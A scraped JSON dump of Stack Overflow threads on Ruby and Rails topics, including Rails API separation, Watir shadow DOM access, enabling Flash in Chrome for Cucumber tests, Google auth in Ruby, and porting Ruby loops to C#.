{"reputation": 46, "user_id": 8556700, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NGAHy.jpg?s=128&g=1", "display_name": "Andrew", "link": "https://stackoverflow.com/users/8556700/andrew"}, "edited": false, "score": 0, "creation_date": 1511923690, "post_id": 47521668, "comment_id": 82045418, "body": "You can just build a REST API using Rails. Ajax is just the term used for accessing an API from your client JavaScript. Definitely look at the Ruby on Rails documentation and check for the API mode link."}], "tags": [], "owner": {"reputation": 46, "user_id": 8556700, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NGAHy.jpg?s=128&g=1", "display_name": "Andrew", "link": "https://stackoverflow.com/users/8556700/andrew"}, "is_accepted": false, "score": 1, "last_activity_date": 1511826375, "creation_date": 1511826375, "answer_id": 47521668, "question_id": 47520570, "link": "https://stackoverflow.com/questions/47520570/how-is-can-back-and-frontend-be-separated-in-ruby-on-rails/47521668#47521668", "title": "How is/can back- and frontend be separated in Ruby on Rails?", "body": "<p>Right now rails-api has been deprecated and merged back into the Rails core. You can use standard Rails to build API routes similar to Dropwizard and then have a frontend framework, like Vue, pull the data using Ajax. You will still use a reverse proxy in front of the Ruby app like nginx so that is no different than Java.</p>\n"}], "owner": {"reputation": 907, "user_id": 3829628, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/c19940738ba88a1ddd90a02a544142ab?s=128&d=identicon&r=PG", "display_name": "A.Dumas", "link": "https://stackoverflow.com/users/3829628/a-dumas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 97, "favorite_count": 0, "closed_date": 1512143184, "answer_count": 1, "score": 0, "last_activity_date": 1511826375, "creation_date": 1511820094, "question_id": 47520570, "link": "https://stackoverflow.com/questions/47520570/how-is-can-back-and-frontend-be-separated-in-ruby-on-rails", "closed_reason": "Needs more focus", "title": "How is/can back- and frontend be separated in Ruby on Rails?", "body": "<p>I am evaluating frameworks and I would like to understand Ruby on Rails architecture better.</p>\n\n<p>Coming form a Java background I developed components separately namely front and backend. More concretely for my backend I use Dropwizard and start a HTTP server. For the front end I use a nginx webserver with some forwarding to connected to my backend api via REST with Json objects. The front end is just plain html and a little JavaScript in vue.js.</p>\n\n<p>Now I am very new to the ruby philosophy and I am quite unsure how Ruby accomplishes the task of separating front and backend. I read some some notes refering to rails-api that can create a HTTP server. But I am still unsure if and how ruby and rails builds this stack.   </p>\n\n<p>I would be glad if someone could explain Ruby on Rails architecture a little bit and maybe point to some tutorials how to accomplish a project with the stack above. Moreover is the stack I used to build in -as mentioned with Java above - even the Ruby way?   </p>\n"}, {"tags": ["jquery", "ruby", "selenium", "watir", "shadow-dom"], "comments": [{"owner": {"reputation": 6589, "user_id": 409820, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b01ab32f3a9016b9e2ade35f3aeb4023?s=128&d=identicon&r=PG", "display_name": "Chuck van der Linden", "link": "https://stackoverflow.com/users/409820/chuck-van-der-linden"}, "edited": false, "score": 0, "creation_date": 1511837405, "post_id": 47520550, "comment_id": 82002634, "body": "Everything given as an argument for execute_script is going to be javascript, as you are asking the browser to execute whatever you provide there..  Won&#39;t matter if the language making the call is Ruby or Java or JS  So likely if you are trying to follow the example you will need to include the <code>body &#47;deep&#47; </code> portion shown in the examples in your code also."}], "answers": [{"tags": [], "owner": {"reputation": 44680, "user_id": 1200545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fbbfea5f6583c16f96fc11ef821cfeee?s=128&d=identicon&r=PG&f=1", "display_name": "Justin Ko", "link": "https://stackoverflow.com/users/1200545/justin-ko"}, "is_accepted": false, "score": 1, "last_activity_date": 1511906776, "creation_date": 1511906776, "answer_id": 47541701, "question_id": 47520550, "link": "https://stackoverflow.com/questions/47520550/how-to-access-and-interact-with-shadow-dom-using-watir/47541701#47541701", "title": "How to access and interact with Shadow DOM using Watir?", "body": "<p>As mentioned by titusfortner's deleted answer, Selenium Easy had a related article, \"<a href=\"http://www.seleniumeasy.com/selenium-tutorials/accessing-shadow-dom-elements-with-webdriver\" rel=\"nofollow noreferrer\">Working with Shadow DOM Elements using Webdriver</a>\". It turns out that you can get a shadow element via JavaScript and then interact with it's descendants as normal.</p>\n\n<p>However, due to the way Watir is written, I had to monkey-patch <code>Watir::Browser</code> to make it work. I'll see if I can get a more permanent fix, but for now, here's a working example:</p>\n\n<pre><code>require 'watir'\n\n# Monkey-patch due to being unable to check the tag name of the shadow root\nclass Watir::Browser\n  def wrap_element(scope, element)\n    Watir.element_class_for(element.tag_name.downcase).new(scope, element: element)\n  rescue Selenium::WebDriver::Error::UnknownError # need a better rescue\n    Watir::Element.new(scope, element: element)\n  end\nend\n\ndef expand_root_element(element, browser)\n    browser.execute_script(\"return arguments[0].shadowRoot\", element)\nend\n\nbrowser = Watir::Browser.new\n\n# Create a download item\nbrowser.goto('https://chromedriver.storage.googleapis.com/2.33/chromedriver_win32.zip')\nbrowser.goto('chrome://downloads')\n\n# Navigate the shadow DOM to the download items\ndownload_manager = browser.element(css: 'downloads-manager')\nshadow_download_manager = expand_root_element(download_manager, browser)\n\ndownload_items = shadow_download_manager.elements(css: '#downloads-list downloads-item')\nshadow_download_items = download_items.map { |s| expand_root_element(s, browser) }\n\n# Find a specific download item by file name\nexpected_file = /chromedriver_win32/\ndownload = shadow_download_items.find { |s| s.span(id: 'name').text_content =~ expected_file }\n\n# Do something with the download - eg wait for the download to complete\ndownload.link(id: 'show').wait_until_present\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31, "user_id": 2730663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ad53037fed4d13dc8f78b3ef3f5fb98?s=128&d=identicon&r=PG&f=1", "display_name": "Justjoehere", "link": "https://stackoverflow.com/users/2730663/justjoehere"}, "is_accepted": false, "score": 0, "last_activity_date": 1609349321, "creation_date": 1609349321, "answer_id": 65511088, "question_id": 47520550, "link": "https://stackoverflow.com/questions/47520550/how-to-access-and-interact-with-shadow-dom-using-watir/65511088#65511088", "title": "How to access and interact with Shadow DOM using Watir?", "body": "<p>I wanted to let people know that this monkey patch no longer works and I do not know of a good work around.</p>\n<p>The initial problem that Justin solved was that a shadow dom attached to an element actually doesn't have a tag name.  Hence his monkey patch.  But with updates, that patch no longer works.  The initial error is a change in JS errors (see bullet #1 below).  The new problem is that shadow dom's are attached to real elements, but the shadowRoot itself is not a real element.  It's like a quasi-element.</p>\n<ul>\n<li>The error is now a <code>Selenium::WebDriver::Error::JavascriptError</code>, so your rescue line needs updated for the correct error.</li>\n<li>Even if you fix that, you'll get more errors <code>javascript error: Failed to execute 'getComputedStyle' on 'Window': parameter 1 is not of type 'Element'</code> This is the result of an internal API call on the wire protocol.  For example, I traced the error to <code>selenium-webdriver-3.142.7/lib/selenium/webdriver/remote/http/default.rb:81</code>  The API call returns an internal 500 error with a payload of <code>&quot;{&quot;value&quot;:{&quot;error&quot;:&quot;javascript error&quot;,&quot;message&quot;:&quot;javascript error: Failed to execute 'getComputedStyle' on 'Window': parameter 1 is not of type 'Element'.\\n  (Session info: chrome=87.0.4280.88)&quot;</code>  I do not  know how to get around this.</li>\n</ul>\n"}], "owner": {"reputation": 11, "user_id": 8973024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/22a8c8f2d5ad3b25cd300ab09d34b488?s=128&d=identicon&r=PG&f=1", "display_name": "Anna ", "link": "https://stackoverflow.com/users/8973024/anna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 811, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1609349321, "creation_date": 1511819984, "last_edit_date": 1511914494, "question_id": 47520550, "link": "https://stackoverflow.com/questions/47520550/how-to-access-and-interact-with-shadow-dom-using-watir", "title": "How to access and interact with Shadow DOM using Watir?", "body": "<p>I need to access this page chrome://downloads/ and check that a file has been downloaded but it's Shadow DOM.</p>\n\n<p>I've found this article how to access DOM Elements With Selenium Webdriver.\n<a href=\"http://jeremysklarsky.github.io/blog/2015/06/13/accessing-shadow-dom-elements-with-selenium-webdriver/\" rel=\"nofollow noreferrer\">http://jeremysklarsky.github.io/blog/2015/06/13/accessing-shadow-dom-elements-with-selenium-webdriver/</a></p>\n\n<p>But this is written in JS</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>driver.executeScript(\"return $('body /deep/ &lt;#yourSelector&gt;')\")\r\n\r\ndriver.executeScript(\"return $('body /deep/ ._mm_column')[0].textContent\").then(function(title){\r\n  title.should.contain(segmentName);\r\n});</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Having changed that to Watir syntax, my code works but doesn't return me the desired results:</p>\n\n<pre class=\"lang-ruby prettyprint-override\"><code>    execute_script(\"return $('&lt;#file-link&gt;')\")\n\n    execute_script(\"return $( '&lt;:contains(test-file.mp3)&gt;')\")\n</code></pre>\n\n<p>I'm just getting nils in the console.</p>\n\n<p><a href=\"https://i.stack.imgur.com/FvAqo.png\" rel=\"nofollow noreferrer\">enter image description here</a></p>\n\n<p>But what I'd like to get is to make sure that the element is present.</p>\n"}, {"tags": ["ruby", "google-chrome", "selenium", "flash", "cucumber"], "answers": [{"comments": [{"owner": {"reputation": 13886, "user_id": 1150534, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/043af7a7ebf89595bebc3364f933d648?s=128&d=identicon&r=PG", "display_name": "Richlewis", "link": "https://stackoverflow.com/users/1150534/richlewis"}, "edited": false, "score": 0, "creation_date": 1511855415, "post_id": 47526295, "comment_id": 82008723, "body": "Thanks for answering. Is there a Ruby version of this?"}, {"owner": {"reputation": 13886, "user_id": 1150534, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/043af7a7ebf89595bebc3364f933d648?s=128&d=identicon&r=PG", "display_name": "Richlewis", "link": "https://stackoverflow.com/users/1150534/richlewis"}, "edited": false, "score": 0, "creation_date": 1511858552, "post_id": 47526295, "comment_id": 82010485, "body": "seems as if <code>setExperimentalOption</code> and <code>set_experimental_option</code> are undefined methods, did you have the same issue ?"}, {"owner": {"reputation": 13886, "user_id": 1150534, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/043af7a7ebf89595bebc3364f933d648?s=128&d=identicon&r=PG", "display_name": "Richlewis", "link": "https://stackoverflow.com/users/1150534/richlewis"}, "edited": false, "score": 1, "creation_date": 1511862785, "post_id": 47526295, "comment_id": 82013268, "body": "Ive marked your answer as useful as it did help in some parts, thanks"}], "tags": [], "owner": {"reputation": 116545, "user_id": 7429447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a25589e600c8ae89717c14e51a6754b?s=128&d=identicon&r=PG&f=1", "display_name": "DebanjanB", "link": "https://stackoverflow.com/users/7429447/debanjanb"}, "is_accepted": false, "score": 2, "last_activity_date": 1511863037, "last_edit_date": 1511863037, "creation_date": 1511854637, "answer_id": 47526295, "question_id": 47520074, "link": "https://stackoverflow.com/questions/47520074/chrome-62-and-flash/47526295#47526295", "title": "Chrome 62 and Flash", "body": "<p>To enable <code>Flash</code> before each test and <code>WhiteList</code> the url you can use the following code block to configure the <code>WebDriver</code> instance to allow <code>Flash</code>:</p>\n\n<pre><code>ChromeOptions options = new ChromeOptions();\nMap&lt;String, Object&gt; prefs = new HashMap&lt;String, Object&gt;();\nprefs.put(\"profile.default_content_setting_values.plugins\", 1);\nprefs.put(\"profile.content_settings.plugin_whitelist.adobe-flash-player\", 1);\nprefs.put(\"profile.content_settings.exceptions.plugins.*,*.per_resource.adobe-flash-player\", 1);\nprefs.put(\"PluginsAllowedForUrls\", \"https://your_url.com\");\noptions.setExperimentalOption(\"prefs\", prefs);\nWebDriver driver = new ChromeDriver(options);\n</code></pre>\n\n<p>Here you can find a detailed discussion on <a href=\"https://support.google.com/chrome/a/answer/7084871?hl=en\" rel=\"nofollow noreferrer\"><strong><code>Manage Flash in Chrome</code></strong></a> and on <a href=\"https://www.chromium.org/administrators/policy-list-3#PluginsAllowedForUrls\" rel=\"nofollow noreferrer\"><strong><code>PluginsAllowedForUrls</code></strong></a></p>\n\n<h2>Update :</h2>\n\n<p>You haven't mentioned in your comment through which client you are not able to find <code>setExperimentalOption</code> or <code>set_experimental_option</code>. Here is the snapshot from my IDE which have no errors/warnings :</p>\n\n<p><a href=\"https://i.stack.imgur.com/xN1nt.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/xN1nt.png\" alt=\"flash\"></a></p>\n\n<p>And here is the <a href=\"https://seleniumhq.github.io/selenium/docs/api/java/org/openqa/selenium/chrome/ChromeOptions.html\" rel=\"nofollow noreferrer\"><strong>JavaDoc</strong></a> :</p>\n\n<p><a href=\"https://i.stack.imgur.com/ZaAGp.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZaAGp.png\" alt=\"setExperimentalOption\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 13886, "user_id": 1150534, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/043af7a7ebf89595bebc3364f933d648?s=128&d=identicon&r=PG", "display_name": "Richlewis", "link": "https://stackoverflow.com/users/1150534/richlewis"}, "is_accepted": false, "score": 0, "last_activity_date": 1511862676, "creation_date": 1511862676, "answer_id": 47528459, "question_id": 47520074, "link": "https://stackoverflow.com/questions/47520074/chrome-62-and-flash/47528459#47528459", "title": "Chrome 62 and Flash", "body": "<p>This is what worked for me in the end</p>\n\n<pre><code>Capybara.register_driver :chrome do |app|\n  chrome_binary = '/Applications/Google Chrome.app'\n  prefs = {\"profile.default_content_setting_values.plugins\" =&gt; 1,\n           \"profile.content_settings.plugin_whitelist.adobe-flash-player\" =&gt; 1,\n           \"profile.content_settings.exceptions.plugins.*,*.per_resource.adobe-flash-player\" =&gt; 1,\n           \"PluginsAllowedForUrls\" =&gt; \"hendricks-as3.localhost.bbc.co.uk\"\n          }\n\n  capabilities = Selenium::WebDriver::Remote::Capabilities.chrome(\"chromeOptions\" =&gt; { \"binary\" =&gt; chrome_binary + '/Contents/MacOS/Google Chrome', \"prefs\" =&gt; prefs })\n  Capybara::Selenium::Driver.new(app, :browser =&gt; :chrome, :desired_capabilities =&gt; capabilities)\nend\n</code></pre>\n\n<p>Reading this documentation helped me realise what to do. (also DebanjanB answer helped me with the specific profile options but as in Java no good to my specific needs, thanks though :-) )</p>\n\n<p><a href=\"https://sites.google.com/a/chromium.org/chromedriver/capabilities\" rel=\"nofollow noreferrer\">https://sites.google.com/a/chromium.org/chromedriver/capabilities</a></p>\n"}], "owner": {"reputation": 13886, "user_id": 1150534, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/043af7a7ebf89595bebc3364f933d648?s=128&d=identicon&r=PG", "display_name": "Richlewis", "link": "https://stackoverflow.com/users/1150534/richlewis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1351, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1549917991, "creation_date": 1511818082, "last_edit_date": 1521762580, "question_id": 47520074, "link": "https://stackoverflow.com/questions/47520074/chrome-62-and-flash", "title": "Chrome 62 and Flash", "body": "<p>I have a Flash-based app that I need to test using Cucumber. As flash is not enabled by default I need to enable it before each test and whitelist the url I believe. If I pause the test in it's background phase I can manually set these options.</p>\n\n<p><a href=\"https://i.stack.imgur.com/9wE6H.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/9wE6H.png\" alt=\"flash option\"></a></p>\n\n<p>How can I automate this approach though, I have looked into adding <code>options</code> and <code>preferences</code>, but still cannot seem to get to work.</p>\n\n<p>So this is my standard setup in an env.rb file</p>\n\n<pre><code>Capybara.register_driver :chrome do |app|\n  chrome_binary = '/Applications/Google Chrome.app'\n  capabilities = Selenium::WebDriver::Remote::Capabilities.chrome(\"chromeOptions\" =&gt; { \"binary\" =&gt; chrome_binary + '/Contents/MacOS/Google Chrome' })\n  Capybara::Selenium::Driver.new(app, :browser =&gt; :chrome, :desired_capabilities =&gt; capabilities, :options =&gt; options)\nend\n</code></pre>\n\n<p>Further reading has highlighted options such as </p>\n\n<pre><code>options = Selenium::WebDriver::Chrome::Options.new\noptions.add_argument('arg-here')\nprefs = {\"enable flash here ? \"}\noptions.add_experimental_option(\"prefs\", prefs)\n</code></pre>\n\n<p>The <code>add_experimental_option</code> throws <code>undefined method add_experimental_option for #&lt;Selenium::WebDriver::Chrome::Options:0x007fca30c10988&gt;</code></p>\n\n<p>Has anyone automated this process?</p>\n"}, {"tags": ["javascript", "ruby-on-rails", "json", "ruby", "cocos2d-js"], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user7159179"}, "is_accepted": false, "score": 0, "last_activity_date": 1511893061, "creation_date": 1511893061, "answer_id": 47538370, "question_id": 47519961, "link": "https://stackoverflow.com/questions/47519961/load-json-file-into-asset-pipeline/47538370#47538370", "title": "Load json file into Asset pipeline", "body": "<p>Fixed!</p>\n\n<p>Just modified the CORS policy on aws to allow access from my web app and everything's done</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7159179"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 310, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511893061, "creation_date": 1511817547, "question_id": 47519961, "link": "https://stackoverflow.com/questions/47519961/load-json-file-into-asset-pipeline", "title": "Load json file into Asset pipeline", "body": "<p>So, I'm trying to use <a href=\"http://cocos2d-x.org/filecenter/jsbuilder/\" rel=\"nofollow noreferrer\">Cocos2d-JS</a> to create a simple game embedded into one of my rails view.</p>\n\n<p>The thing is that cocos requires a farly simple <code>project.json</code> file with some config data in it to run correctly, here's the internal code:</p>\n\n<pre><code>if(!txt){\n    txt = cc.loader._loadTxtSync(\"project.json\");\n}\ndata = JSON.parse(txt);\n</code></pre>\n\n<p>Nonetheless even though I have this JSON file besides the cocos2d-JS .js file, I get always the same error running the rails server on development which is:</p>\n\n<pre><code>GET http://127.0.0.1:3000/project.json 404 (Not Found)\n</code></pre>\n\n<p><strong>What have I tried so far and haven't worked:</strong></p>\n\n<ol>\n<li>Change the path on the js file to use a relative one, doesn't work.</li>\n<li>Putting the JSON file in an aws bucket and try loading it from there, I get a non-authorized access error.</li>\n<li>Renaming the <code>cocos2d.js</code> file to <code>cocos2d.js.erb</code> and lad the json with <code>&lt;%= asset_path 'project.json' %&gt;</code>, this breaks cocos2d itself...</li>\n</ol>\n\n<p><strong>How to bypass in case I can't get an answer:</strong></p>\n\n<p>I would try fixing the aws non authorized access issue, I'm a bit seasoned in Ruby and Rails, but don't fully understand the asset pipeline in order to find an alternative... </p>\n\n<p>So my question is: Is this something related to the asset pipeline? How can I load this .json file into my js?</p>\n\n<p>Thanks a lot!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "authentication", "google-api", "google-signin"], "comments": [{"owner": {"reputation": 1352, "user_id": 502235, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/450f4492b7c4ca82f26d11176880693a?s=128&d=identicon&r=PG", "display_name": "Joshua F. Rountree", "link": "https://stackoverflow.com/users/502235/joshua-f-rountree"}, "edited": false, "score": 0, "creation_date": 1519047182, "post_id": 47519849, "comment_id": 84737861, "body": "I&#39;m also looking for this, did you find it?"}, {"owner": {"reputation": 25043, "user_id": 1417223, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/dbdfe3d2d5f87f172757ada1438f3d16?s=128&d=identicon&r=PG", "display_name": "Fellow Stranger", "link": "https://stackoverflow.com/users/1417223/fellow-stranger"}, "reply_to_user": {"reputation": 1352, "user_id": 502235, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/450f4492b7c4ca82f26d11176880693a?s=128&d=identicon&r=PG", "display_name": "Joshua F. Rountree", "link": "https://stackoverflow.com/users/502235/joshua-f-rountree"}, "edited": false, "score": 0, "creation_date": 1519047389, "post_id": 47519849, "comment_id": 84737992, "body": "No, unfortunately I didn&#39;t... :/"}, {"owner": {"reputation": 787, "user_id": 432926, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5067d62fd774d8a3c0a64078627ea7cc?s=128&d=identicon&r=PG", "display_name": "Alejandro Rizzo", "link": "https://stackoverflow.com/users/432926/alejandro-rizzo"}, "edited": false, "score": 0, "creation_date": 1563379839, "post_id": 47519849, "comment_id": 100683359, "body": "July 2019 and still nothing..."}], "answers": [{"tags": [], "owner": {"reputation": 787, "user_id": 432926, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5067d62fd774d8a3c0a64078627ea7cc?s=128&d=identicon&r=PG", "display_name": "Alejandro Rizzo", "link": "https://stackoverflow.com/users/432926/alejandro-rizzo"}, "is_accepted": false, "score": 2, "last_activity_date": 1563394280, "last_edit_date": 1563394280, "creation_date": 1563389236, "answer_id": 57082417, "question_id": 47519849, "link": "https://stackoverflow.com/questions/47519849/sign-in-users-with-google-auth-library-for-ruby/57082417#57082417", "title": "Sign in users with Google Auth Library for Ruby", "body": "<p>After some research, I found <a href=\"https://github.com/googleads/google-ads-ruby/blob/master/examples/authentication/authenticate_in_standalone_application.rb\" rel=\"nofollow noreferrer\">this collection of samples</a>, where the <code>googleauth</code> gem is used. Here you have it:</p>\n\n<pre class=\"lang-ruby prettyprint-override\"><code>client_id = Google::Auth::ClientId.new(\"your Google client ID\", \"your Google secret\")\nscope = [\"email\",\"profile\"] \ntoken_store = nil # there are actually already implemented File or Redis token stores\ncallback_url = \"http://localhost:8000\"\n\nauthorizer = Google::Auth::UserAuthorizer.new(client_id, scope, token_store, callback_url)\n\ncredentials = authorizer.get_credentials_from_code(code: \"the auth code in the Sign In response\")\n</code></pre>\n"}], "owner": {"reputation": 25043, "user_id": 1417223, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/dbdfe3d2d5f87f172757ada1438f3d16?s=128&d=identicon&r=PG", "display_name": "Fellow Stranger", "link": "https://stackoverflow.com/users/1417223/fellow-stranger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 417, "favorite_count": 2, "answer_count": 1, "score": 4, "last_activity_date": 1563394280, "creation_date": 1511817038, "last_edit_date": 1511817805, "question_id": 47519849, "link": "https://stackoverflow.com/questions/47519849/sign-in-users-with-google-auth-library-for-ruby", "title": "Sign in users with Google Auth Library for Ruby", "body": "<p>I want to sign in users with the <a href=\"https://github.com/google/google-auth-library-ruby\" rel=\"nofollow noreferrer\">google-auth-library-ruby\n</a> gem.</p>\n\n<p>In their guides \"Google Sign-In for server-side apps \" they have <a href=\"https://developers.google.com/identity/sign-in/web/server-side-flow#step_7_exchange_the_authorization_code_for_an_access_token\" rel=\"nofollow noreferrer\">a good code example</a> how to exchange the authorization code for an ID token, but it's only for Python (and Java):</p>\n\n<pre><code>credentials = client.credentials_from_clientsecrets_and_code(\nCLIENT_SECRET_FILE,\n['https://www.googleapis.com/auth/drive.appdata', 'profile', 'email'],\nauth_code)\n</code></pre>\n\n<p>Does anybody know about the equivalent for Ruby?</p>\n\n<p>PS. I'm familiar with the omniauth gem, but would like to use the <code>google-auth-library-ruby</code> gem if possible.</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511815383, "post_id": 47519409, "comment_id": 81995191, "body": "It would result in an error as <code>.find(id: 2)</code> is invalid syntax."}, {"owner": {"reputation": 996, "user_id": 2387313, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/0f9bb8f3e7a6cf91b8bbe4ec436e6c3d?s=128&d=identicon&r=PG", "display_name": "Siva", "link": "https://stackoverflow.com/users/2387313/siva"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511815858, "post_id": 47519409, "comment_id": 81995441, "body": "My bad, edited to find_by"}], "answers": [{"tags": [], "owner": {"reputation": 591, "user_id": 8502555, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Gysjl.jpg?s=128&g=1", "display_name": "e_a_o", "link": "https://stackoverflow.com/users/8502555/e-a-o"}, "is_accepted": true, "score": 2, "last_activity_date": 1511818383, "creation_date": 1511818383, "answer_id": 47520151, "question_id": 47519409, "link": "https://stackoverflow.com/questions/47519409/querying-an-associationscollectionproxy/47520151#47520151", "title": "Querying an Associations::CollectionProxy", "body": "<p><code>ActiveRecord::Associations::CollectionProxy.find</code> method uses the same rules as <code>ActiveRecord::Base.find</code> which is used to retrieve a database row by ID.</p>\n\n<p>So, <code>my_association_collection.find_by(id: 2)</code> or <code>my_association_collection.find(2)</code> will always execute a <code>SELECT</code> query on the database, not reference the existing result.</p>\n\n<p>See <a href=\"http://api.rubyonrails.org/classes/ActiveRecord/Associations/CollectionProxy.html#method-i-find\" rel=\"nofollow noreferrer\">doc</a></p>\n"}], "owner": {"reputation": 996, "user_id": 2387313, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/0f9bb8f3e7a6cf91b8bbe4ec436e6c3d?s=128&d=identicon&r=PG", "display_name": "Siva", "link": "https://stackoverflow.com/users/2387313/siva"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 0, "accepted_answer_id": 47520151, "answer_count": 1, "score": 1, "last_activity_date": 1511818383, "creation_date": 1511815061, "last_edit_date": 1511815849, "question_id": 47519409, "link": "https://stackoverflow.com/questions/47519409/querying-an-associationscollectionproxy", "title": "Querying an Associations::CollectionProxy", "body": "<p>If I have a an </p>\n\n<pre><code>Associations::CollectionProxy\n [#ModelName id: 1, name: my_model, #ModelName id: 2, name: my_model2]\n</code></pre>\n\n<p>Would the following make a db request?</p>\n\n<pre><code>my_association_collection.find_by(id: 2)\n</code></pre>\n\n<p>Or would it reference the existing result?</p>\n"}, {"tags": ["c#", "ruby"], "comments": [{"owner": {"reputation": 22172, "user_id": 2557128, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f3cc7fed3c952511b85cfb1c822ecb75?s=128&d=identicon&r=PG", "display_name": "NetMage", "link": "https://stackoverflow.com/users/2557128/netmage"}, "edited": false, "score": 0, "creation_date": 1511818434, "post_id": 47518993, "comment_id": 81996759, "body": "What does the code do in Ruby?"}, {"owner": {"reputation": 3307, "user_id": 2266827, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/Frcc8.png?s=128&g=1", "display_name": "jeffdill2", "link": "https://stackoverflow.com/users/2266827/jeffdill2"}, "edited": false, "score": 0, "creation_date": 1511818519, "post_id": 47518993, "comment_id": 81996791, "body": "Have you tried Googling &quot;C# loops&quot; or &quot;Ruby loops&quot; to research either method?"}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511819814, "post_id": 47518993, "comment_id": 81997448, "body": "Was that &quot;Ruby&quot; code already translated to Ruby from another language? Looks like a very bad way to write <code>minmax.map { |min, max| min + (max - min) * rand }</code>."}], "answers": [{"tags": [], "owner": {"reputation": 22172, "user_id": 2557128, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f3cc7fed3c952511b85cfb1c822ecb75?s=128&d=identicon&r=PG", "display_name": "NetMage", "link": "https://stackoverflow.com/users/2557128/netmage"}, "is_accepted": false, "score": -2, "last_activity_date": 1511819705, "last_edit_date": 1511819705, "creation_date": 1511819314, "answer_id": 47520381, "question_id": 47518993, "link": "https://stackoverflow.com/questions/47518993/how-to-convert-loops-in-ruby-to-c/47520381#47520381", "title": "How to convert loops in Ruby to C#?", "body": "<p>Using LINQ, you can convert these as follows:</p>\n\n<pre><code>var rand = new Random();\nreturn Enumerable.Range(0, minmax.Length-1).Select(i =&gt; minmax[i][0]+((minmax[i][1] - minmax[i][0])*rand.NextDouble())).ToArray();\n</code></pre>\n\n<p>For the second one:</p>\n\n<pre><code>var sum = vector.Select((input, i) =&gt; new { input, i }).Aggregate(0, (s, input_i) =&gt; s+weights[input_i.i]*input_i.input);\n</code></pre>\n\n<p>Or perhaps:</p>\n\n<pre><code>var sum = vector.Zip(weights, (v,w) =&gt; v*w).Sum();\n</code></pre>\n\n<p>In C# however, looping is normally done with <code>for</code> or <code>foreach</code>:</p>\n\n<pre><code>var rand = new Random();\nvar res = new Array(minmax.Length);\nfor (var i = 0; i &lt; minmax.Length; ++i)\n    res[i] = minmax[i][0] + ((minmax[i][1] - minmax[i][0])*rand.GetDouble());\nreturn res;\n</code></pre>\n\n<p>For the second:</p>\n\n<pre><code>for (var i = 0; i &lt; vector.Length; ++i)\n    sum += weights[i] * 